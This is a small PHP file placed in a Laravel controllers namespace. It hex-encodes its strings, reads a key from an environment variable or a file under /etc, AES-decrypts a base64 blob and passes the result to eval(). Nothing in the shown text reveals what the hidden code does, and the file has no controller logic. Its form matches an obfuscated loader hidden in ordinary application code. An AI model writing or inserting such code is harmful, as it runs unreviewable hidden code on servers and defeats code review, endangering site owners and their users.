<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('SnTOwqU65H2EWgS6MtUMHg==');

$c=base64_decode(

'uHy5eVB8MK1rlSmcsSLdR0KeAoW9pzvPuuWsf4JO3A3o2HQa3XeWluoHQvjYM27lC+m5bKnw9zob' .
'Xd/YzkNAkTKpNzKqfA+ixlGH2kKkDT+/62jz88yymaH4RSQlsuyXxKH/QzJJY5h/dr9k1bVrpHNd' .
'EueY/svJoh9mK1OHxxYQQ8DoVz9JkvQOUpl3r0f6vbGfcv7BITKQ4TDt/UoglIETRiIIhRLlHpl0' .
'JwjFPVAbR9cyKGOIptr3udS+zN65UnFZ0/0m7vt2GPDEGh1lNc3Hi7K6Lv9BwGSbjyl1cc4='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

